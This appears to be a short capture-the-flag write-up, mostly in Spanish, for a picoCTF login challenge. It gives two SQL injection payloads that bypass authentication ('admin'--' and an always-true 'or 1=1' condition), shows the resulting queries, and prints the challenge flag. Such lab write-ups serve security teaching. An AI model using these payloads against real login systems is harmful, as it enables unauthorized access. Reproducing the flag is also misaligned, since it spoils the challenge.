### Scavenger Hunt
### Description 

There is a website running at `https://jupiter.challenges.picoctf.org/problem/33850/` ([link](https://jupiter.challenges.picoctf.org/problem/33850/)) or http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login
### Hint

-  There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
- Try to think about how the website verifies your login.

## Solución  1
```
usamos el usuario `admin'--_` para comentar el resto de la consulta, ignorando la verificación de contraseña.
username: admin'--_
password: hola
SQL query: SELECT * FROM users WHERE name='admin'--_' AND password='hola'

# Logged in!


picoCTF{s0m3_SQL_f8adf3fb}
```


## Solución  2

```
usamos de ejemplo `juan' or 1=1;` para hacer que la condición **siempre sea verdadera**, logrando acceso sin importar el usuario o contraseña.

username: juan' or 1=1;
password: hola
SQL query: SELECT * FROM users WHERE name='juan' or 1=1;' AND password='hola'

# Logged in!

Your flag is: picoCTF{s0m3_SQL_f8adf3fb}
```